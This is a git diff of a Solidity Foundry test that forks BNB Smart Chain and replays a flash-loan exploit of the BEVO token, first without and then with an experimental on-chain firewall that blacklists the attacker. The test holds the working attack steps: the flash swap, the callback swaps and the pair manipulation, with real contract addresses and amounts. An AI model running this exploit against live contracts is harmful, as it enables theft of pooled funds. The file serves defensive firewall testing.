@@ -16,6 +16,7 @@ import {ProxyForRouter} from "../src/proxy/proxyForRouter.sol";
 import {FireWallRouterV2} from "../src/Implemention/RouterV2.sol";
 import {SimpleSwap} from "../src/Implemention/testFireWallexp.sol";
 import "../src/Implemention/interface.sol";
+// import "../out/testCoinToken.sol/CoinToken.json";
 
 import "../src/proxy/utils/StorageSlot.sol";
 import "../src/proxy/utils/Address.sol";
@@ -43,18 +44,18 @@ contract TestFireWallThroughOnChainAttack is Test {
         IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     // reflectiveERC20 private constant bevo = reflectiveERC20(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
     CoinToken bevo = CoinToken(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
-    CoinToken bevo2 =
-        new CoinToken(
-            "BEVO NFT Art Token",
-            "BEVO",
-            0x9,
-            0x12a05f200,
-            0,
-            0,
-            0,
-            0x473141B6f5E33DD90BD653940a854b58e83451DB,
-            0xacF1363E4E6e98dC6649cbD80069E3F95c677a8A
-        );
+    // CoinToken bevo2 =
+    //     new CoinToken(
+    //         "BEVO NFT Art Token",
+    //         "BEVO",
+    //         0x9,
+    //         0x12a05f200,
+    //         0,
+    //         0,
+    //         0,
+    //         0x473141B6f5E33DD90BD653940a854b58e83451DB,
+    //         0xacF1363E4E6e98dC6649cbD80069E3F95c677a8A
+    //     );
 
     IUniswapV2Pair private constant wbnb_usdc =
         IUniswapV2Pair(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b);
@@ -68,6 +69,15 @@ contract TestFireWallThroughOnChainAttack is Test {
     // TODO:整理一下复现的思路：1.在本地创建一个bevo 2.将本地的bevo的状态设置为与链上的bevo合约一致(但是我觉的很难，所以我觉的能将资金设置成一样就够了)
     // 3.创建对应的pair(本地bevo与wbnb) 4.要保证这个pair中的两种代币的金额与链上的一致
     function setUp() public {
+        cheats.createSelectFork("bsc", 25_230_702);
+        // fork and label
+        cheats.createSelectFork("bsc", 25_230_702);
+        cheats.label(address(wbnb), "WBNB");
+        cheats.label(address(bevo), "BEVO");
+        cheats.label(address(wbnb_usdc), "PancakePair: WBNB-USDC");
+        cheats.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
+        cheats.label(address(pancakeRouter), "PancakeRouter");
+
         vm.startPrank(deployer, deployer);
         console.log("deployer %s", deployer);
         // ============================= deploy registry and router =============================
@@ -92,6 +102,7 @@ contract TestFireWallThroughOnChainAttack is Test {
             admin,
             InitData_Router
         );
+        console.log("proxyForRouter's address is:",address(proxyForRouter));
 
         // ============================= deploy modules through proxy =============================
         // 部署param模块
@@ -121,6 +132,7 @@ contract TestFireWallThroughOnChainAttack is Test {
             true
         );
         proxyForRegistry.CallOn(addModuledata2);
+
     }
 
     // 回调函数
@@ -130,6 +142,7 @@ contract TestFireWallThroughOnChainAttack is Test {
         uint256 /*amount1*/,
         bytes calldata /*data*/
     ) external {
+        vm.startPrank(address(this),address(this));
         address[] memory path = new address[](2);
         path[0] = address(wbnb);
         path[1] = address(bevo);
@@ -143,6 +156,7 @@ contract TestFireWallThroughOnChainAttack is Test {
             block.timestamp
         );
         // =====================================================
+        console.log("++++++++++++++++++++++++++++++++++++");
         console.log(
             "after first swap, the this balance of bevo:",
             bevo.balanceOf(address(this))
@@ -157,141 +171,115 @@ contract TestFireWallThroughOnChainAttack is Test {
         );
         bevo_wbnb.swap(337 ether, 0, address(this), "");
         wbnb.transfer(address(wbnb_usdc), 193 ether);
+        console.log("++++++++++++++++++++++++++++++++++++");
     }
 
     function testOnchainAttackBeforeUseFireWall() public {
-        // fork and label
-        cheats.createSelectFork("bsc", 25_230_702);
-        cheats.label(address(wbnb), "WBNB");
-        cheats.label(address(bevo), "BEVO");
-        cheats.label(address(wbnb_usdc), "PancakePair: WBNB-USDC");
-        cheats.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
-        cheats.label(address(pancakeRouter), "PancakeRouter");
-
-        console.log("=============================================");
-        emit log_named_decimal_uint(
-            "WBNB balance before exploit",
-            wbnb.balanceOf(address(bevo)),
-            18
-        );
-        emit log_named_decimal_uint(
-            "BEVO balance before exploit",
-            bevo.balanceOf(address(bevo)),
-            18
-        );
-        console.log("=============================================");
-        // Attack
+        console.log("==========================================");
+        console.log("start attack");
         emit log_named_decimal_uint(
             "WBNB balance before exploit",
             wbnb.balanceOf(address(this)),
             18
         );
+        emit log_named_decimal_uint(
+            "BEVO balance before exploit",
+            bevo.balanceOf(address(this)),
+            18
+        );
+        // Attack
         //1.First approve Pancake router
         vm.startPrank(address(this));
         wbnb.approve(address(pancakeRouter), type(uint256).max);
         //2.swap-flashloan
         wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));
         emit log_named_decimal_uint(
-            "WBNB balance after exploit",
+            "This contract WBNB balance after exploit",
             wbnb.balanceOf(address(this)),
             18
         );
     }
 
     function testOnchainAttackAfterUseFireWall() public {
-        // fork and label 25_230_702
-        cheats.createSelectFork("bsc", 25_230_702);
-        cheats.label(address(wbnb), "WBNB");
-        cheats.label(address(bevo), "BEVO");
-        cheats.label(address(wbnb_usdc), "PancakePair: WBNB-USDC");
-        cheats.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
-        cheats.label(address(pancakeRouter), "PancakeRouter");
         // prepare
-        // deal(address(bevo), address(bevo2), 0.000079312955896627 ether);
-        console.log("+++++++++++++++++++++++++++++++++++++++++++");
-        console.log(
-            "After deal, the bevo balance of local bevo is :",
-            bevo2.balanceOf(address(bevo2))
-        );
-        console.log("+++++++++++++++++++++++++++++++++++++++++++");
+        bytes memory bytecodeWithFireWall = vm.getDeployedCode("testCoinToken.sol:CoinToken");
+        vm.etch(address(bevo), bytecodeWithFireWall);
 
-        // create a local pair
-        bytes memory data = abi.encodeWithSignature(
-            "createPair(address,address)",
-            address(wbnb),
-            address(bevo2)
+        // ========================deploy and registry test contract=====================
+        vm.startPrank(deployer, deployer);
+        // 注册信息
+        string[] memory params = new string[](1);
+        params[0] = "uint256";
+        address[] memory enableModules = new address[](2);
+        enableModules[0] = address(paramModule);
+        enableModules[1] = address(authModule);
+        // 注册
+        bytes memory registryData = abi.encodeWithSignature(
+            "register(address,address,bytes4,string[],address[])",
+            address(bevo),
+            deployer,
+            bevo.deliver.selector,
+            params,
+            enableModules
         );
-        address PancakeFactory = 0xBCfCcbde45cE874adCB698cC183deBcF17952812;
-        (bool success, ) = PancakeFactory.call(data);
-        console.log("is success?:", success);
+        proxyForRegistry.CallOn(registryData);
+        vm.stopPrank();
+        //黑名单拦截1
+        bytes memory auth_data = abi.encode(
+            address(bevo),
+            true,
+            bevo.deliver.selector,
+            address(this),
+            true,
+            false
+        );
+        bytes memory authUpdateData = abi.encodeWithSignature(
+            "updataModuleInfo(address,bytes)",
+            address(authModule),
+            auth_data
+        );
+        vm.prank(deployer);
+        proxyForRegistry.CallOn(authUpdateData);
 
-        // flashloan WBNB from PancakePair
+       console.log("=============================================");
+       console.log("start attack");
         emit log_named_decimal_uint(
             "WBNB balance before exploit",
             wbnb.balanceOf(address(this)),
             18
         );
+        emit log_named_decimal_uint(
+            "BEVO balance before exploit",
+            bevo.balanceOf(address(this)),
+            18
+        );
+        // Attack
         //1.First approve Pancake router
+        vm.startPrank(address(this));
         wbnb.approve(address(pancakeRouter), type(uint256).max);
         //2.swap-flashloan
         wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));
         emit log_named_decimal_uint(
-            "WBNB balance after exploit",
+            "This contract WBNB balance after exploit",
             wbnb.balanceOf(address(this)),
             18
         );
 
-        //     //========================deploy and registry test contract=====================
-        //     vm.startPrank(deployer, deployer);
-        //     // 注册信息
-        //     string[] memory params = new string[](1);
-        //     params[0] = "uint256";
-        //     address[] memory enableModules = new address[](2);
-        //     enableModules[0] = address(paramModule);
-        //     enableModules[1] = address(authModule);
-        //     // 注册
-        //     bytes memory registryData = abi.encodeWithSignature(
-        //         "register(address,address,bytes4,string[],address[])",
-        //         address(bevo),
-        //         deployer,
-        //         bevo.deliver.selector,
-        //         params,
-        //         enableModules
-        //     );
-        //     proxyForRegistry.CallOn(registryData);
-        //     vm.stopPrank();
-        //     //黑名单拦截1
-        //     bytes memory auth_data = abi.encode(
-        //         address(bevo),
-        //         true,
-        //         bevo.deliver.selector,
-        //         address(this),
-        //         true,
-        //         false
-        //     );
-        //     bytes memory authUpdateData = abi.encodeWithSignature(
-        //         "updataModuleInfo(address,bytes)",
-        //         address(authModule),
-        //         auth_data
-        //     );
-        //     vm.prank(deployer);
-        //     proxyForRegistry.CallOn(authUpdateData);
-
-        //     //参数拦截
-        //     bytes memory data = abi.encode(
-        //         address(testContract),
-        //         testContract.test_attack.selector,
-        //         0,
-        //         100,
-        //         0,
-        //         true
-        //     );
-        //     bytes memory paramUpdataData = abi.encodeWithSignature(
-        //         "updataModuleInfo(address,bytes)",
-        //         address(paramModule),
-        //         data
-        //     );
-        //     vm.prank(deployer);
-        //     proxyForRegistry.CallOn(paramUpdataData);
+        //参数拦截
+        // bytes memory data = abi.encode(
+        //     address(testContract),
+        //     testContract.test_attack.selector,
+        //     0,
+        //     100,
+        //     0,
+        //     true
+        // );
+        // bytes memory paramUpdataData = abi.encodeWithSignature(
+        //     "updataModuleInfo(address,bytes)",
+        //     address(paramModule),
+        //     data
+        // );
+        // vm.prank(deployer);
+        // proxyForRegistry.CallOn(paramUpdataData);
     }
 }
